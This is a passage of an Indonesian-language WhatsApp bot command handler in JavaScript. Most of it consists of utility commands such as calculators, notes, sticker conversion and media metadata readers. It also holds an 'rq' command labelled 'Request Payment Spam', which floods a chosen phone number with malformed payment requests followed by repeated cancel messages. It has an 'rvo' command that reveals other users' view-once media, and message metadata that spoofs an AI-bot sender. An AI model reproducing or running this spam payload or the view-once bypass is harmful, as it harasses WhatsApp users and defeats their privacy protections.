        `📊 Status : ${isBotMuted?"🔇 Muted":"🔊 Active"} | ${botMode==="private"?"🔒 Private":"🌐 Public"}\n` +
        `📖 AutoRead : ${autoRead?"✅":"❌"} | ✏️ AutoType: ${autoTyping?"✅":"❌"}`
      );
      break;
    }

    case "info": {
      const userRole = roleDB.get(m.sender) || "User";
      const pollOptions = [`Nama: ${pushname}`, `Nomor: ${senderNumber}`, `Role: ${userRole}`, `Owner: ${isOwner?"✅ Ya":"❌ Tidak"}`];
      if (isGroup && groupMetadata) {
        pollOptions.push(`Grup: ${groupMetadata.subject}`);
        pollOptions.push(`Admin: ${isAdmins?"✅ Ya":"❌ Tidak"}`);
        pollOptions.push(`Member: ${groupMembers.length} orang`);
      }
      await WaSocket.sendMessage(m.chat, { poll: { name: `📊 INFO — ${pushname}`, values: pollOptions, selectableCount: 1 } }, { quoted: x });
      break;
    }

    case "owner": {
      const ownerNumber = owners[0] || "6287838882011";
      const ownerClean  = ownerNumber.replace(/[^0-9]/g,'');
      await WaSocket.sendMessage(m.chat, { contacts: { displayName: "Owner", contacts: [{ vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Cryskyy Owner\nTEL;type=CELL;type=VOICE;waid=${ownerClean}:+${ownerClean}\nEND:VCARD` }] } }, { quoted: x });
      break;
    }

    case "ourweb": {
      await WaSocket.sendMessage(m.chat, {
        text: "🌐 *Cryskyy Official Web*\n\nhttps://cryskyydev.biz.id",
        contextInfo: { externalAdReply: { title: "Cryskyy Project", body: "Click to visit website", thumbnail: CryskyyLogo, sourceUrl: "https://cryskyydev.biz.id", mediaType: 1 } }
      }, { quoted: x });
      break;
    }

    case "tts": { if (!q) { reply("❌ .tts [teks]"); break; } reply(`*${q}*`); break; }

    case "calc": {
      if (!q) { reply("❌ .calc [ekspresi]\nContoh: .calc 10 * 5 + 3"); break; }
      try {
        if (!/^[\d\s\+\-\*\/\.\(\)%^]+$/.test(q)) throw new Error("Karakter tidak valid!");
        const hasil = Function(`"use strict"; return (${q})`)();
        reply(`🔢 *Kalkulator*\n\n📥 Input : \`${q}\`\n📤 Hasil : *${hasil}*`);
      } catch (e) { reply(`❌ Error: ${e.message}`); }
      break;
    }

    case "b64enc": { if (!q) { reply("❌ .b64enc [teks]"); break; } reply(`🔤 *Base64 Encode*\n\n${Buffer.from(q).toString('base64')}`); break; }
    case "b64dec": {
      if (!q) { reply("❌ .b64dec [base64]"); break; }
      try { reply(`🔓 *Base64 Decode*\n\n${Buffer.from(q,'base64').toString('utf-8')}`); } catch { reply("❌ String tidak valid!"); }
      break;
    }

    case "reverse": { if (!q) { reply("❌ .reverse [teks]"); break; } reply(`🔠 *Reverse*\n\n${q.split('').reverse().join('')}`); break; }

    case "charcount": {
      if (!q) { reply("❌ .charcount [teks]"); break; }
      const words = q.trim().split(/\s+/).length;
      reply(`📏 *Character Count*\n\n📝 Dengan spasi : *${q.length}*\n📝 Tanpa spasi  : *${q.replace(/\s/g,'').length}*\n💬 Kata         : *${words}*`);
      break;
    }

    case "random": {
      const rParts = q.split('-'); const rMin = parseInt(rParts[0])||1; const rMax = parseInt(rParts[1])||100;
      if (rMin >= rMax) { reply("❌ .random [min]-[max]\nContoh: .random 1-1000"); break; }
      reply(`🎰 *Random Number*\n\n📊 Range : ${rMin} — ${rMax}\n🎯 Hasil : *${Math.floor(Math.random()*(rMax-rMin+1))+rMin}*`);
      break;
    }

    case "suhu": {
      if (!q) { reply("❌ .suhu [angka][c/f/k]\nContoh: .suhu 100c"); break; }
      const sm = q.match(/^(-?\d+\.?\d*)([cfk])$/i);
      if (!sm) { reply("❌ Format salah! Contoh: .suhu 100c"); break; }
      const sv = parseFloat(sm[1]); const su = sm[2].toLowerCase();
      let sc, sf, sk;
      if (su==='c'){sc=sv;sf=sc*9/5+32;sk=sc+273.15;}
      else if (su==='f'){sf=sv;sc=(sf-32)*5/9;sk=sc+273.15;}
      else{sk=sv;sc=sk-273.15;sf=sc*9/5+32;}
      reply(`🌡️ *Konversi Suhu*\n\n🔵 Celsius    : *${sc.toFixed(2)}°C*\n🔴 Fahrenheit : *${sf.toFixed(2)}°F*\n🟡 Kelvin     : *${sk.toFixed(2)} K*`);
      break;
    }

    case "tanggal": {
      const tz = q || "Asia/Jakarta"; const tnow = moment.tz(tz);
      reply(`📅 *Tanggal & Waktu*\n\n🕐 Waktu   : *${tnow.format("HH:mm:ss")}*\n📆 Tanggal : *${tnow.format("dddd, DD MMMM YYYY")}*\n🌍 Zona    : *${tz}*`);
      break;
    }

    case "quote": {
      const quotes = [
        "💡 \"The best way to predict the future is to create it.\" — Drucker",
        "🚀 \"Stay hungry, stay foolish.\" — Steve Jobs",
        "🌊 \"In the middle of every difficulty lies opportunity.\" — Einstein",
        "🔥 \"It does not matter how slowly you go as long as you do not stop.\" — Confucius",
        "⚡ \"The only limit to our realization of tomorrow is our doubts of today.\" — Roosevelt",
        "🌙 \"Code is like humor. When you have to explain it, it's bad.\" — Cory House",
        "🎯 \"First, solve the problem. Then, write the code.\" — John Johnson",
        "💎 \"Talk is cheap. Show me the code.\" — Linus Torvalds",
        "🌟 \"Simplicity is the soul of efficiency.\" — Austin Freeman",
        "🧠 \"Make it work, make it right, make it fast.\" — Kent Beck",
        "🔮 \"Any sufficiently advanced technology is indistinguishable from magic.\" — Arthur C. Clarke",
        "🌈 \"The only way to do great work is to love what you do.\" — Steve Jobs"
      ];
      reply(`📜 *Random Quote*\n\n${quotes[Math.floor(Math.random()*quotes.length)]}`);
      break;
    }

    case "setnote": {
      const nParts = q.split('|');
      if (nParts.length < 2) { reply("❌ .setnote [judul]|[isi]"); break; }
      const nk = nParts[0].trim().toLowerCase(); const nv = nParts.slice(1).join('|').trim();
      notes.set(nk, { val: nv, by: pushname, time: moment.tz("Asia/Jakarta").format("DD/MM HH:mm") });
      reply(`📝 *Catatan disimpan!*\n\n📌 Judul: *${nk}*\n📄 Isi  : ${nv}`);
      break;
    }

    case "getnote": {
      if (!q) {
        if (notes.size === 0) { reply("📋 Belum ada catatan."); break; }
        const nl = [...notes.keys()].map((k,i)=>`${i+1}. ${k}`).join('\n');
        reply(`📋 *Daftar Catatan (${notes.size})*\n\n${nl}\n\nKetik *.getnote [judul]* untuk membaca.`);
        break;
      }
      const nn = notes.get(q.toLowerCase());
      if (!nn) { reply(`❌ Catatan *${q}* tidak ditemukan!`); break; }
      reply(`📖 *${q}*\n\n${nn.val}\n\n_Disimpan oleh ${nn.by} · ${nn.time}_`);
      break;
    }

    case "delnote": {
      if (!q) { reply("❌ .delnote [judul]"); break; }
      if (!notes.has(q.toLowerCase())) { reply(`❌ Catatan *${q}* tidak ada!`); break; }
      notes.delete(q.toLowerCase()); reply(`🗑️ Catatan *${q}* dihapus!`);
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  STATS — Rich Card + Poll
    // ══════════════════════════════════════════════════════════
    case "stats": {
      try {
        const src = fs.readFileSync(__filename, 'utf8');
        const matches = src.match(/case\s+["']([^"']+)["']\s*[:{]/g) || [];
        const cmds = [...new Set(matches.map(mm => {
          const r = mm.match(/case\s+["']([^"']+)["']/);
          return r ? r[1] : null;
        }).filter(Boolean))];
        const uptimeSec = Math.floor((Date.now() - startTime) / 1000);
        const tgActive  = tgBots.filter(b => b.token).length;
        const totalMins = Math.floor(uptimeSec / 60);

        // ── 1. Rich Card (code block atas, image bawah) ────────
        const subcontent = [
          {
            messageType: 5,
            codeMetadata: {
              codeLanguage: "javascript",
              codeBlocks: [
                { highlightType: 0, codeContent: "// Cryskyy Bot Stats\n" },
                { highlightType: 3, codeContent: `total_command : ${cmds.length}\n` },
                { highlightType: 3, codeContent: `tg_connected  : ${tgActive}\n` },
                { highlightType: 3, codeContent: `uptime_menit  : ${totalMins}\n` },
                { highlightType: 3, codeContent: `mode          : "${botMode}"\n` },
                { highlightType: 3, codeContent: `auto_read     : ${autoRead}\n` },
                { highlightType: 3, codeContent: `anti_link     : ${antilink}\n` },
                { highlightType: 0, codeContent: `// ${time} · ${date}` }
              ]
            }
          },
          {
            messageType: 3,
            imageMetadata: {
              imageUrl: {
                imagePreviewUrl: "https://cryskyydev.biz.id/logo.jpg",
                imageHighResUrl: "https://cryskyydev.biz.id/logo.jpg",
                sourceUrl:       "https://cryskyydev.biz.id/logo.jpg"
              },
              imageText:  "Cryskyy Project",
              alignment:  2,
              tapLinkUrl: "https://wa.me/6287838882011/"
            }
          }
        ];

        const richMsg = generateWAMessageFromContent(m.chat, {
          botForwardedMessage: {
            message: {
              richResponseMessage: {
                messageType: 1,
                submessages: subcontent,
                contextInfo: {
                  forwardingScore: 1,
                  isForwarded: true,
                  forwardedAiBotMessageInfo: { botJid: "867051314767696@bot" },
                  forwardOrigin: 4
                }
              }
            }
          }
        }, {});

        await WaSocket.relayMessage(m.chat, richMsg.message, {});

        // ── 2. Poll snapshot (di bawah rich card) ──────────────
        await WaSocket.relayMessage(m.chat, {
          pollResultSnapshotMessage: {
            pollVotes: [
              { optionName: "🔧 Total Command",  optionVoteCount: cmds.length },
              { optionName: "🤖 TG Connected",   optionVoteCount: tgActive    },
              { optionName: "⏱️ Uptime (Menit)", optionVoteCount: totalMins   }
            ],
            name: "📊 Statistik Cryskyy Bot",
            contextInfo: { forwardingScore: 999, isForwarded: true },
            pollType: 0
          }
        }, {});

      } catch (e) { reply(`❌ Gagal: ${e.message}`); }
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  RC — Rich Card Custom (owner)
    // ══════════════════════════════════════════════════════════
    case "rc": {
      if (!isOwner) { reply("❌ Owner only!"); break; }
      // Format: .rc [judul]|[code isi]|[url image]|[url link]
      const rcParts   = q ? q.split('|') : [];
      const rcTitle   = rcParts[0]?.trim() || "Cryskyy Project";
      const rcCode    = rcParts[1]?.trim() || '"name": "Cryskyydev.biz.id"';
      const rcImgUrl  = rcParts[2]?.trim() || "https://cryskyydev.biz.id/logo.jpg";
      const rcLinkUrl = rcParts[3]?.trim() || "https://wa.me/6287838882011/";
      try {
        const rcSub = [
          {
            messageType: 5,
            codeMetadata: {
              codeLanguage: "json",
              codeBlocks: [
                { highlightType: 0, codeContent: "{\n" },
                { highlightType: 3, codeContent: `  ${rcCode}\n` },
                { highlightType: 0, codeContent: "}" }
              ]
            }
          },
          {
            messageType: 3,
            imageMetadata: {
              imageUrl: {
                imagePreviewUrl: rcImgUrl,
                imageHighResUrl: rcImgUrl,
                sourceUrl:       rcImgUrl
              },
              imageText:  rcTitle,
              alignment:  2,
              tapLinkUrl: rcLinkUrl
            }
          }
        ];
        const rcMsg = generateWAMessageFromContent(m.chat, {
          botForwardedMessage: {
            message: {
              richResponseMessage: {
                messageType: 1,
                submessages: rcSub,
                contextInfo: {
                  forwardingScore: 1,
                  isForwarded: true,
                  forwardedAiBotMessageInfo: { botJid: "867051314767696@bot" },
                  forwardOrigin: 4
                }
              }
            }
          }
        }, {});
        await WaSocket.relayMessage(m.chat, rcMsg.message, {});
      } catch (e) { reply(`❌ Gagal: ${e.message}`); }
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  EXC — Execute JS async (owner)
    // ══════════════════════════════════════════════════════════
    case "exc": {
      if (!isOwner) { reply("❌ Owner only!"); break; }
      if (!q) { reply("❌ .exc [kode JS]\nContoh: .exc return 1+1\nContoh: .exc const r = await fetch('https://api.ipify.org?format=json'); return (await r.json()).ip"); break; }
      try {
        let ev = await eval(`(async () => { ${q} })()`);
        if (typeof ev === 'undefined') ev = "✅ Executed (no return value)";
        if (typeof ev !== 'string') ev = require('util').inspect(ev, { depth: 3 });
        if (ev.length > 3000) ev = ev.substring(0, 3000) + '\n...(terpotong)';
        reply(`⚡ *EXC Result*\n\n\`\`\`\n${ev}\n\`\`\``);
      } catch (err) {
        reply(`❌ *EXC Error*\n\n\`\`\`\n${String(err)}\n\`\`\``);
      }
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  RQ — Request Payment Spam (owner)
    // ══════════════════════════════════════════════════════════
    case "rq": {
      if (!isOwner) { reply("❌ Owner only!"); break; }
      if (!q || !q.includes(',')) { reply("❌ .rq [nomor],[jumlah]\nContoh: .rq 6287838882011,5\n\n📌 Max 20, min 1"); break; }
      const rqParts  = q.split(',');
      const rqNum    = rqParts[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
      const rqCount  = Math.min(Math.max(parseInt(rqParts[1]) || 1, 1), 20);
      reply(`⏳ *Sending ${rqCount}x RQ ke* ${rqNum.split('@')[0]}...`);
      let rqOk = 0, rqFail = 0;
      for (let i = 0; i < rqCount; i++) {
        try {
          const k = await WaSocket.relayMessage(m.chat, {
            groupStatusMessageV2: {
              message: {
                requestPaymentMessage: {
                  currencyCodeIso4217: "IDR",
                  amount1000: "1000000000",
                  requestFrom: rqNum,
                  noteMessage: {
                    extendedTextMessage: { text: "Cryskyy" }
                  },
                  expiryTimestamp: "0",
                  amount: {
                    value: "1000000000",
                    offset: 1000,
                    currencyCode: "IDR"
                  },
                  background: {
                    id: "dzy",
                    fileLength: "999999",
                    width: -99999,
                    height: -99999,
                    mimetype: "IMAGE",
                    placeholderArgb: 20816,
                    textArgb: 4100048132,
                    subtextArgb: 2940630892
                  }
                }
              }
            }
          }, {});
          for (let z = 0; z < 5; z++) {
            await WaSocket.relayMessage(m.chat, {
              declinePaymentRequestMessage: {
                key: { remoteJid: m.chat, fromMe: true, id: k }
              }
            }, {}).catch(() => {});
            await WaSocket.relayMessage(m.chat, {
              cancelPaymentRequestMessage: {
                key: { remoteJid: m.chat, fromMe: true, id: k }
              }
            }, {}).catch(() => {});
          }
          rqOk++;
        } catch { rqFail++; }
        await new Promise(r => setTimeout(r, 800));
      }
      reply(`✅ *RQ selesai!*\n\n✔️ Berhasil: ${rqOk}\n❌ Gagal: ${rqFail}`);
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  ADDFL / LISTFL / DELFL / VID1 — File Manager PTV
    // ══════════════════════════════════════════════════════════
    case "addfl": {
      if (!isOwner) { reply("❌ Owner only!"); break; }
      if (!q) { reply("❌ .addfl [nama_file.mp4]\nContoh: .addfl cyx.mp4\n\nLalu reply video + ketik .addfl nama"); break; }
      if (!isMedia || !/video/.test(mime)) { reply("❌ Reply video untuk menyimpan!\n\nContoh: reply video lalu ketik .addfl cyx.mp4"); break; }
      try {
        reply(`⏳ *Menyimpan* ${q.trim()}...`);
        const buf = await WaSocket.downloadMediaMessage(quoted);
        savedFiles.set(q.trim(), buf);
        reply(
          `✅ *File disimpan!*\n\n` +
          `📁 Nama  : ${q.trim()}\n` +
          `📏 Size  : ${fmtBytes(buf.length)}\n\n` +
          `Kirim dengan: *.vid1 ${q.trim()}*`
        );
      } catch (e) { reply(`❌ Gagal: ${e.message}`); }
      break;
    }

    case "listfl": {
      if (!isOwner) { reply("❌ Owner only!"); break; }
      if (savedFiles.size === 0) { reply("📁 Belum ada file.\n\nGunakan .addfl [nama] lalu reply video."); break; }
      const flList = [...savedFiles.entries()].map(([name, buf], i) => `${i+1}. ${name} — ${fmtBytes(buf.length)}`).join('\n');
      reply(`📁 *File Tersimpan*\n\n${flList}\n\nTotal: ${savedFiles.size}`);
      break;
    }

    case "delfl": {
      if (!isOwner) { reply("❌ Owner only!"); break; }
      if (!q) { reply("❌ .delfl [nama_file]"); break; }
      if (!savedFiles.has(q.trim())) { reply(`❌ File *${q}* tidak ada!\n\nCek daftar: .listfl`); break; }
      savedFiles.delete(q.trim());
      reply(`🗑️ File *${q}* dihapus!`);
      break;
    }

    case "vid1": {
      if (!isOwner) { reply("❌ Owner only!"); break; }
      if (!q) { reply("❌ .vid1 [nama_file]\nContoh: .vid1 cyx.mp4\n\nSimpan file dulu: .addfl [nama] (reply video)\nLihat file: .listfl"); break; }
      const v1File = savedFiles.get(q.trim());
      if (!v1File) {
        reply(
          `❌ File *${q}* tidak ditemukan!\n\n` +
          `📌 Cara simpan:\n` +
          `1. Reply video\n` +
          `2. Ketik: *.addfl ${q.trim()}*\n\n` +
          `📁 Lihat daftar: *.listfl*`
        );
        break;
      }
      try {
        reply(`⏳ *Mengirim* ${q}...`);
        // Coba sendPtv dulu, fallback ke sendMessage ptv:true
        if (typeof WaSocket.sendPtv === 'function') {
          await WaSocket.sendPtv(m.chat,
            { buffer: v1File },
            {
              contextInfo: {
                isForwarded: true,
                forwardingScore: 999,
                forwardedNewsletterMessageInfo: {
                  newsletterName: "Cryskyy Project",
                  newsletterJid: "1@newsletter"
                }
              }
            }
          );
        } else {
          await WaSocket.sendMessage(m.chat, {
            video: v1File,
            ptv: true,
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterName: "Cryskyy Project",
                newsletterJid: "1@newsletter"
              }
            }
          }, { quoted: x });
        }
      } catch (e) { reply(`❌ Gagal kirim: ${e.message}`); }
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  STICKER / MEDIA
    // ══════════════════════════════════════════════════════════
    case "sticker":
case "s": {
  // Ambil pesan yang di-reply atau pesan itu sendiri
  const stickerQuoted = m.quoted || m;
  const stickerMsg    = stickerQuoted?.msg || stickerQuoted?.message || stickerQuoted || {};
  const stickerMime   = stickerMsg?.mimetype || 
                        stickerMsg?.imageMessage?.mimetype || 
                        stickerMsg?.videoMessage?.mimetype || '';

  if (!stickerMime || !/image|video/.test(stickerMime)) {
    reply("❌ Reply gambar/video dulu!");
    break;
  }
  try {
    const mediaBuffer = await WaSocket.downloadMediaMessage(stickerQuoted);
    await WaSocket.sendMessage(m.chat, { sticker: mediaBuffer }, { quoted: x });
  } catch (err) {
    reply("❌ Gagal buat sticker: " + err.message);
  }
  break;
}

    case "toimg": {
      if (!isMedia || !/sticker/.test(mime)) { reply("❌ Reply sticker!"); break; }
      try { const media = await WaSocket.downloadMediaMessage(quoted); await WaSocket.sendMessage(m.chat, { image: media, caption: "✅ Berhasil dikonversi!" }, { quoted: x }); }
      catch { reply("❌ Gagal konversi!"); }
      break;
    }

    case "mp3": {
      if (!q) { reply("❌ .mp3 [url_mp3]"); break; }
      if (!q.match(/\.(mp3|m4a|aac|ogg)$/i) && !q.includes("http")) { reply("❌ URL tidak valid!"); break; }
      try { reply("⏳ *Processing...*"); await WaSocket.sendMessage(m.chat, { audio: { url: q }, mimetype: 'audio/mpeg', ptt: true }, { quoted: x }); }
      catch { reply("❌ Gagal kirim voice note!"); }
      break;
    }

    case "qr": {
      if (!q) { reply("❌ .qr [teks atau URL]"); break; }
      reply("⏳ *Generating QR Code...*");
      try {
        await WaSocket.sendMessage(m.chat, {
          image: { url: `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(q)}&size=400x400&format=png&margin=10` },
          caption: `📱 *QR Code*\n\n📝 Data : ${q.length>50?q.substring(0,50)+'...':q}`
        }, { quoted: x });
      } catch { reply("❌ Gagal buat QR Code!"); }
      break;
    }

    case "rvo": {
  // Ambil pesan quoted
  const rvoQuoted = m.quoted || null;
  if (!rvoQuoted) { reply("❌ Reply pesan view-once dulu!"); break; }

  const rvoMsg  = rvoQuoted?.msg || rvoQuoted?.message || rvoQuoted || {};
  const rvoMime = rvoMsg?.mimetype ||
                  rvoMsg?.imageMessage?.mimetype ||
                  rvoMsg?.videoMessage?.mimetype ||
                  rvoMsg?.audioMessage?.mimetype || '';

  // Cek apakah ini memang view-once
  const isViewOnce = !!(
    rvoQuoted?.message?.viewOnceMessage ||
    rvoQuoted?.message?.viewOnceMessageV2 ||
    rvoMsg?.viewOnce
  );

  if (!rvoMime && !isViewOnce) {
    reply("❌ Reply media view-once (sekali lihat)!");
    break;
  }

  try {
    reply("⏳ *Membuka view-once...*");
    const rvoBuf = await WaSocket.downloadMediaMessage(rvoQuoted);

    if (/image/.test(rvoMime)) {
      await WaSocket.sendMessage(m.chat, {
        image: rvoBuf,
        caption: "🔓 *View-Once dibuka oleh bot*"
      }, { quoted: x });
    } else if (/video/.test(rvoMime)) {
      await WaSocket.sendMessage(m.chat, {
        video: rvoBuf,
        caption: "🔓 *View-Once dibuka oleh bot*"
      }, { quoted: x });
    } else if (/audio/.test(rvoMime)) {
      await WaSocket.sendMessage(m.chat, {
        audio: rvoBuf,
        mimetype: rvoMime || 'audio/ogg; codecs=opus',
        ptt: true
      }, { quoted: x });
    } else {
      reply("❌ Tipe media tidak dikenali: " + (rvoMime || "unknown"));
    }
  } catch (e) {
    reply("❌ Gagal buka view-once: " + e.message);
  }
  break;
}

    // ══════════════════════════════════════════════════════════
    //  FILE & METADATA TOOLS
    // ══════════════════════════════════════════════════════════
    case "imgmeta": {
      if (!isMedia || !/image/.test(mime)) { reply("❌ Reply gambar untuk baca metadata!"); break; }
      reply("🔍 *Membaca metadata gambar...*");
      try {
        const buf = await WaSocket.downloadMediaMessage(quoted);
        const hex = buf.toString('hex');
        const fileSize = buf.length;
        let fmt = "Unknown";
        if (hex.startsWith('ffd8ff')) fmt = "JPEG";
        else if (hex.startsWith('89504e47')) fmt = "PNG";
        else if (hex.startsWith('47494638')) fmt = "GIF";
        else if (hex.startsWith('52494646')) fmt = "WEBP";
        const md5  = crypto.createHash('md5').update(buf).digest('hex');
        const sha1 = crypto.createHash('sha1').update(buf).digest('hex');
        let width = "?", height = "?";
        if (fmt === "JPEG") {
          for (let i = 0; i < buf.length - 9; i++) {
            if (buf[i] === 0xFF && [0xC0,0xC1,0xC2].includes(buf[i+1])) {
              height = (buf[i+5] << 8) | buf[i+6];
              width  = (buf[i+7] << 8) | buf[i+8];
              break;
            }
          }
        } else if (fmt === "PNG" && buf.length > 24) {
          width  = buf.readUInt32BE(16);
          height = buf.readUInt32BE(20);
        }
        reply(
          `🖼️ *Image Metadata*\n\n` +
          `📄 Format  : *${fmt}*\n` +
          `📏 Ukuran  : *${fmtBytes(fileSize)}* (${fileSize.toLocaleString()} bytes)\n` +
          `📐 Dimensi : *${width} × ${height}* px\n\n` +
          `🔐 *Hash*\n` +
          `MD5  : \`${md5}\`\n` +
          `SHA1 : \`${sha1}\``
        );
      } catch (e) { reply(`❌ Gagal baca metadata: ${e.message}`); }
      break;
    }

    case "exifrm": {
      if (!isMedia || !/image/.test(mime)) { reply("❌ Reply gambar untuk hapus EXIF!"); break; }
      reply("🗑️ *Menghapus metadata EXIF...*");
      try {
        const buf = await WaSocket.downloadMediaMessage(quoted);
        const hex = buf.toString('hex');
        let cleaned = buf;
        if (hex.startsWith('ffd8ff')) {
          const result = [];
          result.push(buf[0], buf[1]);
          let i = 2;
          while (i < buf.length - 1) {
            if (buf[i] !== 0xFF) { i++; continue; }
            const marker = buf[i+1];
            if (marker >= 0xE1 && marker <= 0xEF) {
              const segLen = (buf[i+2] << 8) | buf[i+3];
              i += 2 + segLen; continue;
            }
            if (marker === 0xDA) {
              for (let j = i; j < buf.length; j++) result.push(buf[j]);
              break;
            }
            if (i + 3 < buf.length) {
              const segLen = (buf[i+2] << 8) | buf[i+3];
              for (let j = i; j < Math.min(i+2+segLen, buf.length); j++) result.push(buf[j]);
              i += 2 + segLen;
            } else { result.push(buf[i]); i++; }
          }
          cleaned = Buffer.from(result);
        }
        await WaSocket.sendMessage(m.chat, {
          image: cleaned,
          caption: `✅ *EXIF Dihapus!*\n\n📦 Sebelum : ${fmtBytes(buf.length)}\n📦 Sesudah : ${fmtBytes(cleaned.length)}\n🗑️ Terhapus : ${fmtBytes(buf.length - cleaned.length)}`
        }, { quoted: x });
      } catch (e) { reply(`❌ Gagal hapus EXIF: ${e.message}`); }
      break;
    }

    case "imgcompress": {
      const quality = Math.min(Math.max(parseInt(q)||60, 10), 95);
      if (!isMedia || !/image/.test(mime)) { reply("❌ Reply gambar untuk dikompres!\n\n.imgcompress [1-95] lalu reply gambar"); break; }
      reply(`⏳ *Info gambar (kualitas ${quality}%)...*`);
      try {
        const buf = await WaSocket.downloadMediaMessage(quoted);
        const md5 = crypto.createHash('md5').update(buf).digest('hex').substring(0,8);
        await WaSocket.sendMessage(m.chat, {
          image: buf,
          caption: `📦 *Image Info*\n\n📏 Ukuran  : ${fmtBytes(buf.length)}\n🎯 Kualitas: ${quality}%\n🔑 Hash    : ${md5}...\n\n_💡 Kompresi penuh butuh: npm i sharp_`
        }, { quoted: x });
      } catch (e) { reply(`❌ Gagal: ${e.message}`); }
      break;
    }

    case "videometa": {
      if (!isMedia || !/video/.test(mime)) { reply("❌ Reply video untuk baca metadata!"); break; }
      reply("🔍 *Membaca metadata video...*");
      try {
        const buf = await WaSocket.downloadMediaMessage(quoted);
        const fileSize = buf.length;
        const hex = buf.toString('hex').substring(0, 16);
        let fmt = "Unknown";
        if (hex.includes('66747970')) fmt = "MP4/M4V";
        else if (buf.slice(0,4).toString() === 'RIFF') fmt = "AVI";
        else if (hex.startsWith('1a45dfa3')) fmt = "MKV/WEBM";
        const md5    = crypto.createHash('md5').update(buf).digest('hex');
        const sha256 = crypto.createHash('sha256').update(buf).digest('hex').substring(0,32) + '...';
        let duration = "?";
        const bufHex = buf.toString('hex');
        const mvhdIdx = bufHex.indexOf('6d766864');
        if (mvhdIdx !== -1) {
          const mvhdOffset = mvhdIdx / 2;
          if (mvhdOffset + 24 < buf.length) {
            try {
              const version = buf[mvhdOffset + 4];
              if (version === 0) {
                const timescale = buf.readUInt32BE(mvhdOffset + 12);
                const dur       = buf.readUInt32BE(mvhdOffset + 16);
                if (timescale > 0) duration = `${(dur/timescale).toFixed(1)}s`;
              } else if (version === 1) {
                const timescale = buf.readUInt32BE(mvhdOffset + 20);
                const durHigh   = buf.readUInt32BE(mvhdOffset + 24);
                const durLow    = buf.readUInt32BE(mvhdOffset + 28);
                const dur = durHigh * 0x100000000 + durLow;
                if (timescale > 0) duration = `${(dur/timescale).toFixed(1)}s`;
              }
            } catch {}
          }
        }
        reply(
          `🎬 *Video Metadata*\n\n` +
          `📄 Format  : *${fmt}*\n` +
          `📏 Ukuran  : *${fmtBytes(fileSize)}*\n` +
          `⏱️ Durasi  : *${duration}*\n\n` +
          `🔐 *Hash*\n` +
          `MD5    : \`${md5.substring(0,16)}...\`\n` +
          `SHA256 : \`${sha256}\``
        );
      } catch (e) { reply(`❌ Gagal baca metadata: ${e.message}`); }
      break;
    }

    case "audiometa": {
      if (!isMedia || !/audio/.test(mime)) { reply("❌ Reply audio untuk baca metadata!"); break; }
      reply("🔍 *Membaca metadata audio...*");
      try {
        const buf = await WaSocket.downloadMediaMessage(quoted);
        const fileSize = buf.length;
        const hex4 = buf.toString('hex').substring(0,8);
        let fmt = "Unknown";
        if (hex4.startsWith('494433')) fmt = "MP3 (ID3v2)";
        else if (hex4.startsWith('fffb') || hex4.startsWith('fff3') || hex4.startsWith('fff2')) fmt = "MP3";
        else if (hex4.startsWith('4f676753')) fmt = "OGG";
        else if (hex4.startsWith('664c6143')) fmt = "FLAC";
        else if (hex4.startsWith('52494646')) fmt = "WAV";
        else if (mime.includes('ogg')) fmt = "OGG/Opus";
        else if (mime.includes('mp4')) fmt = "AAC/M4A";
        let artist = "-", title = "-", album = "-";
        if (buf.toString('ascii', 0, 3) === 'ID3') {
          const id3Size = ((buf[6]&0x7F)<<21)|((buf[7]&0x7F)<<14)|((buf[8]&0x7F)<<7)|(buf[9]&0x7F);
          let pos = 10;
          while (pos < Math.min(10 + id3Size, buf.length - 10)) {
            const frameId = buf.toString('ascii', pos, pos+4);
            const frameSize = buf.readUInt32BE(pos+4);
            if (frameSize <= 0 || frameSize > 100000) break;
            const frameData = buf.slice(pos+10+1, pos+10+frameSize).toString('utf8').replace(/\x00/g,'').trim();
            if (frameId === 'TIT2') title = frameData || "-";
            else if (frameId === 'TPE1') artist = frameData || "-";
            else if (frameId === 'TALB') album = frameData || "-";
            pos += 10 + frameSize;
          }
        }
        const md5 = crypto.createHash('md5').update(buf).digest('hex');
        reply(
          `🎵 *Audio Metadata*\n\n` +
          `📄 Format  : *${fmt}*\n` +
          `📏 Ukuran  : *${fmtBytes(fileSize)}*\n` +
          `🎵 MIME    : ${mime}\n\n` +
          `🏷️ *ID3 Tags*\n` +
          `🎤 Artist : ${artist}\n` +
          `🎵 Title  : ${title}\n` +
          `💿 Album  : ${album}\n\n` +
          `🔐 MD5    : \`${md5.substring(0,16)}...\``
        );
      } catch (e) { reply(`❌ Gagal baca metadata: ${e.message}`); }
      break;
    }

    case "filehash": {
      if (!isMedia) { reply("❌ Reply file/gambar/video/audio untuk hitung hash!"); break; }
      reply("🔐 *Menghitung hash file...*");
      try {
        const buf    = await WaSocket.downloadMediaMessage(quoted);
        const md5    = crypto.createHash('md5').update(buf).digest('hex');
        const sha1   = crypto.createHash('sha1').update(buf).digest('hex');
        const sha256 = crypto.createHash('sha256').update(buf).digest('hex');
        reply(
          `🔐 *File Hash*\n\n` +
          `📏 Ukuran : *${fmtBytes(buf.length)}*\n` +
          `📄 MIME   : ${mime}\n\n` +
          `🔵 MD5    :\n\`${md5}\`\n\n` +
          `🟡 SHA1   :\n\`${sha1}\`\n\n` +
          `🔴 SHA256 :\n\`${sha256}\``
        );
      } catch (e) { reply(`❌ Gagal hitung hash: ${e.message}`); }
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  NETWORK & WEB TOOLS
    // ══════════════════════════════════════════════════════════
    case "myip": {
      reply("🔍 *Mengambil IP publik bot...*");
      try {
        const res = await axios.get("https://api.ipify.org?format=json", { timeout: 8000 });
        const ip  = res.data.ip;
        const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp,org,timezone`, { timeout: 8000 });
        const d   = geo.data;
        reply(
          `🌐 *IP Bot / Server*\n\n` +
          `📍 IP       : *${ip}*\n` +
          `🏳️ Negara  : ${d.country}\n` +
          `🏙️ Kota    : ${d.city}, ${d.regionName}\n` +
          `🕐 Timezone : ${d.timezone}\n` +
          `🏢 ISP      : ${d.isp}\n` +
